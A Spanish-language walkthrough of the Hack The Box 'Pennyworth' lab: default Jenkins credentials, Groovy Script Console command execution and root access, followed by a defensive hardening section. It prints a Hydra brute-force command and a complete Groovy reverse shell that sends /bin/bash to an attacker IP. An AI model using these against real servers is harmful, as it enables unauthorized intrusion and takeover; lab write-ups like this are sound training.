---
title: Pennyworth (HTB Starting Point)
date: 2026-06-15
tags: [ciberseguridad, htb, starting-point, pentesting, jenkins, groovy, rce, reverse-shell, credenciales-debiles]
type: nota
status: en-progreso
source: claude-code
aliases: [pennyworth, pennyworth htb, jenkins rce htb]
---

# Pennyworth — HTB Starting Point (Tier 1)

Tier 1 · SO: Linux · Dificultad: Very Easy · Skills: Jenkins Script Console, Groovy RCE, reverse shell

Jenkins es una herramienta de automatización CI/CD muy común en entornos de desarrollo. Esta máquina muestra que exponer su panel web con credenciales débiles es equivalente a dar acceso de ejecución directa al servidor. Hack The Box es un laboratorio de pentesting legal y autorizado; toda práctica aquí es ética y controlada.

---

## Objetivo

Acceder al servidor Jenkins explotando credenciales débiles, usar la Script Console de Groovy para obtener ejecución remota de comandos (RCE) y capturar la flag.

---

## Acceso a la maquina (paso previo)

Antes de atacar nada necesitas conectarte a la red de HTB y arrancar la maquina para obtener su **IP**:

1. **Descarga tu VPN** desde el panel de HTB (Starting Point -> *Connect* -> descarga el `.ovpn`).
2. **Conectate a la VPN** y dejala corriendo en una terminal aparte:
   ```bash
   sudo openvpn starting_point_<tu_usuario>.ovpn
   ```
3. **Lanza la maquina** en la web (boton *Spawn Machine*). HTB te dara una **IP** (tipo `10.129.x.x`).
4. Comprueba que llegas a ella:
   ```bash
   ping -c2 <IP>
   ```
5. En el resto de este writeup, **sustituye `<IP>` por la IP que te toque** (es dinamica: cambia cada vez que lanzas la maquina).

> Alternativa sin VPN: el **Pwnbox** (Kali en el navegador que ofrece HTB) ya viene conectado a la red; solo lanzas la maquina y usas su IP directamente.

## Reconocimiento

**Categoría: escaneo de puertos y detección de servicios.**

```bash
nmap -sC -sV -p- --open -T4 <IP>
```

Resultado esperado relevante:

```
8080/tcp open  http  Jetty 9.4.x (Jenkins)
```

Un solo servicio expuesto: Jenkins corriendo en el puerto 8080. Jetty es el servidor embebido que usa Jenkins por defecto. No hay SSH ni otros puertos en esta máquina.

---

## Enumeración

**Categoría: inspección de aplicación web / panel de administración.**

Navegar a `http://<IP>:8080` en el navegador. Se presenta la pantalla de login de Jenkins.

Probar credenciales por defecto o débiles:

| Usuario | Contraseña |
|---------|------------|
| admin   | password   |
| admin   | admin      |
| jenkins | jenkins    |

En esta máquina funciona `admin` / `password`. Si en tu instancia no funciona, prueba las otras combinaciones de la tabla; en un examen real se usaría también un diccionario con Hydra, pero el patrón de Starting Point es credenciales triviales.

```bash
# Opcional: fuerza bruta del login con Hydra si las obvias fallan
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-form-post \
  "/j_spring_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password" \
  -s 8080 <IP>
```

---

## Acceso inicial (foothold)

**Categoría: RCE mediante consola de scripts de administración (Jenkins Script Console / Groovy).**

**Patrón:** Jenkins incluye una Script Console en `Manage Jenkins → Script Console` que ejecuta código Groovy arbitrario con los permisos del proceso Jenkins. Si tienes acceso al panel de administración, tienes RCE inmediato — no hace falta explotar ninguna vulnerabilidad adicional.

### Paso 1 — Verificar ejecución de comandos

Una vez logueado, ir a:

```
http://<IP>:8080/script
```

En la consola Groovy, ejecutar un comando de sistema para confirmar RCE:

```groovy
println "id".execute().text
```

Devuelve algo como `uid=0(root) gid=0(root) groups=0(root)` — Jenkins corre como root en esta máquina, lo que significa que obtenemos acceso directo como root.

### Paso 2 — Reverse shell

En tu máquina atacante, abrir un listener:

```bash
nc -lvnp 4444
```

En la Script Console de Jenkins, lanzar la reverse shell. Ajusta `<TU_IP>` y el puerto al de tu listener:

```groovy
String host = "<TU_IP>"
int port = 4444
String cmd = "/bin/bash"
Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start()
Socket s = new Socket(host, port)
InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream()
OutputStream po = p.getOutputStream(), so = s.getOutputStream()
while (!s.isClosed()) {
    while (pi.available() > 0) so.write(pi.read())
    while (pe.available() > 0) so.write(pe.read())
    while (si.available() > 0) po.write(si.read())
    so.flush()
    po.flush()
    Thread.sleep(50)
}
```

Al ejecutar, el listener recibe una shell interactiva en el servidor.

---

## Escalada de privilegios

No requiere privesc: Jenkins corre como root en esta máquina, por lo que la shell obtenida ya tiene máximos privilegios. La flag se obtiene directamente desde el foothold.

---

## Flags

Esta máquina tiene una única flag (root). Su ubicación típica en Starting Point Tier 1:

```bash
find / -name "root.txt" 2>/dev/null
cat /root/root.txt
```

Flag: `<flag>`

> Nota: en algunas instancias puede estar en `/root/root.txt` o en el directorio home del usuario de servicio. Compruébalo con `find` si la ruta directa no funciona.

---

## Patron y teoria

**Esta sección es la más importante del writeup.**

### El patrón: panel de administración expuesto = consola de ejecución

Jenkins (y herramientas similares: Grafana, Jupyter, Rundeck, Portainer) incluyen consolas de scripts o terminales integradas pensadas para administración legítima. El flujo de ataque es siempre el mismo:

```
credenciales débiles → login como admin → consola de scripts → RCE → shell
```

No hay CVE. No hay exploit. El producto funciona exactamente como fue diseñado, pero con el actor equivocado dentro.

### Por qué esto ocurre en producción

1. Instalaciones rápidas que nunca cambian la contraseña por defecto.
2. Jenkins expuesto en red pública o interna amplia (asumiendo que "nadie lo sabe").
3. Procesos de CI/CD que corren como root porque "es más fácil".

### Cómo se defiende / diseña para evitarlo (perspectiva dev/purple team)

| Capa | Medida concreta |
|------|----------------|
| **Autenticación** | Contraseña robusta + MFA. Nunca dejar credenciales por defecto. |
| **Red** | Jenkins nunca expuesto a internet. Acceso solo por VPN o IP allowlist. |
| **RBAC** | Usar la matriz de permisos de Jenkins (Role Strategy Plugin). Restringir `Overall/Administer` a cuentas contadas. |
| **Script Console** | Desactivarla si no se usa (`/configureSecurity/` → deshabilitar CLI y script console para usuarios no administradores). O mejor: eliminar el rol que la habilita via RBAC. |
| **Proceso de servicio** | Jenkins no debe correr como root. Usar un usuario de sistema dedicado con permisos mínimos. |
| **Auditoría** | Activar logs de acceso y alertar sobre logins en `/script` o endpoints de administración. |
| **Secrets** | Las credenciales de Jenkins nunca en el código. Usar Jenkins Credentials Store o un vault externo (HashiCorp Vault, AWS Secrets Manager). |

### Groovy como vector de RCE — entender el mecanismo

Groovy es un lenguaje JVM. `"cmd".execute()` llama directamente a `Runtime.exec()` de Java. No hay sandbox efectivo en la Script Console: cualquier código Groovy válido puede leer ficheros, escribir, abrir sockets, cargar clases nativas. Desde la perspectiva del desarrollador que construye pipelines CI/CD, esto es una feature potente; desde la perspectiva de seguridad, es una puerta trasera si el panel no está correctamente asegurado.

---

## Conexiones

- [[HTB_Starting_Point/00_README]]
- [[MOC_Ciberseguridad]]
- [[12-aprender-y-carrera]]
- [[13-herramientas-en-detalle]]
